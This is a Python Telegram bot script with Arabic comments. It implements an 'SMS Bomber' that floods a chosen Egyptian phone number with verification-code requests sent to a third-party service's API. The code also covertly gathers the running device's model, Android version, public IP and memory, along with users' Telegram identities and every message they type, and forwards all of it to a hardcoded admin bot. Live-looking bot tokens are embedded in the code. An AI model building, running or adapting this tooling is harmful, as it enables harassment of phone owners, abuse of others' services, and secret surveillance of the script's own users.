import sys
import subprocess
import time
import threading
import requests
import smtplib
import random
import json
import os
import platform
import socket
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr

# --- [Auto-Setup] تثبيت المكاتب تلقائياً ---
def setup_environment():
    try:
        import telebot
    except ImportError:
        print("Installing pyTelegramBotAPI...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI"])
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])

setup_environment()
import telebot
from telebot import types

# ==========================================
# ⚙️ إعدادات البوت والآدمن
# ==========================================
API_TOKEN = '5531260100:AAGN253OooBiLpv2CCEGAi_RRFC-rPVxgfQ'
ADMIN_TOKEN = '5499505058:AAFKz6ZnE-eLOcBclSUIWMH6Z78mKo23G1M' 
ADMIN_ID = 1431886140

bot = telebot.TeleBot(API_TOKEN)
admin_bot = telebot.TeleBot(ADMIN_TOKEN)

if not os.path.exists("User_Logs"): os.makedirs("User_Logs")

active_attacks = {}  
user_states = {}
user_data = {}
USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/114.0.0.0 Safari/537.36"]

# ==========================================
# 📱 دالة جمع معلومات الهاتف (Android Info)
# ==========================================
def get_phone_report():
    report = "\n\n<b>📱 تقرير هاتف الأندرويد المشغل للكود:</b>\n"
    try:
        brand = subprocess.getoutput("getprop ro.product.brand")
        model = subprocess.getoutput("getprop ro.product.model")
        ver = subprocess.getoutput("getprop ro.build.version.release")
        
        # معلومات الشبكة
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            public_ip = "N/A"
            
        report += f"- المصنع: {brand}\n- الموديل: {model}\n- إصدار أندرويد: {ver}\n"
        report += f"- IP الخارجي: {public_ip}\n"
        report += f"- المعالج: {platform.machine()}\n"
        report += f"- الذاكرة: {subprocess.getoutput('free -m | grep Mem')}\n"
    except Exception as e:
        report += f"❌ خطأ في جمع بيانات الهاتف: {e}"
    return report

# ==========================================
# 📝 نظام التبليغ والتسجيل
# ==========================================
def log_user_input(user, text):
    try:
        with open(f"User_Logs/{user.id}.txt", "a", encoding="utf-8") as f:
            f.write(f"⏰ {datetime.now().strftime('%H:%M:%S')} | 📝 {text}\n")
    except: pass

def send_full_log_to_admin(message):
    try:
        user = message.from_user
        # بيانات التلجرام
        log_msg = (
            f"🔔 <b>مستخدم جديد دخل البوت!</b>\n\n"
            f"👤 الاسم: {user.first_name} {user.last_name or ''}\n"
            f"📧 اليوزر: @{user.username or 'لا يوجد'}\n"
            f"🆔 الآيدي: <code>{user.id}</code>\n"
        )
        # دمج تقرير الهاتف
        log_msg += get_phone_report()
        
        admin_bot.send_message(ADMIN_ID, log_msg, parse_mode="HTML")
    except Exception as e:
        print(f"❌ Error sending admin log: {e}")

# ==========================================
# 🚀 محركات الهجوم (Engines)
# ==========================================
def update_dashboard(cid, msg_id, tool_name, target, sent, failed, status="جاري العمل 🟢"):
    text = (f"🛡️ **SPAM Bot**\n🛠️ الأداة: `{tool_name}`\n🎯 الهدف: `{target}`\n"
            f"📊 الحالة: {status}\n✅ تم: **{sent}** | ❌ فشل: **{failed}**")
    try: bot.edit_message_text(chat_id=cid, message_id=msg_id, text=text, parse_mode="Markdown")
    except: pass

def run_sms(cid, phone, count, msg_id):
    sent = 0; failed = 0
    for i in range(count):
        if not active_attacks.get(cid, True): break
        try:
            resp = requests.post("https://api.twistmena.com/music/Dlogin/sendCode", 
                                 json={"dial": f"2{phone}"}, timeout=10)
            if resp.status_code == 200: sent += 1
            else: failed += 1
        except: failed += 1
        update_dashboard(cid, msg_id, "SMS Bomber", phone, sent, failed)
        time.sleep(random.randint(2, 5))
    update_dashboard(cid, msg_id, "SMS Bomber", phone, sent, failed, status="اكتملت ✅")

# ==========================================
# 🕹️ منطق البوت الأساسي
# ==========================================
@bot.message_handler(commands=['start'])
def welcome(message):
    cid = message.chat.id
    threading.Thread(target=send_full_log_to_admin, args=(message,)).start()
    log_user_input(message.from_user, "/start")
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add("💣 SMS", "🛑 Stop All")
    bot.send_message(cid, "🚀 نظام السبام جاهز للعمل يا محمود.", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def handle_all(message):
    cid = message.chat.id
    text = message.text
    log_user_input(message.from_user, text)

    if text == "🛑 Stop All":
        active_attacks[cid] = False
        bot.send_message(cid, "🛑 تم الإيقاف.")
    elif text == "💣 SMS":
        user_states[cid] = 'wait_sms'
        bot.send_message(cid, "أدخل الرقم المصري (10xxxx):")
    elif user_states.get(cid) == 'wait_sms':
        msg = bot.send_message(cid, "🚀 جاري البدء...")
        active_attacks[cid] = True
        threading.Thread(target=run_sms, args=(cid, text, 50, msg.message_id)).start()
        user_states[cid] = None

# ==========================================
# 👑 لوحة تحكم الأدمن
# ==========================================
@admin_bot.message_handler(commands=['start'])
def admin_panel(message):
    if message.from_user.id == ADMIN_ID:
        admin_bot.send_message(ADMIN_ID, "👑 أهلاً محمود. البوت يعمل الآن ويجمع البيانات.")

# ==========================================
# 🔥 التشغيل
# ==========================================
if __name__ == "__main__":
    threading.Thread(target=lambda: admin_bot.infinity_polling()).start()
    print("✅ Bots are running...")
    bot.infinity_polling()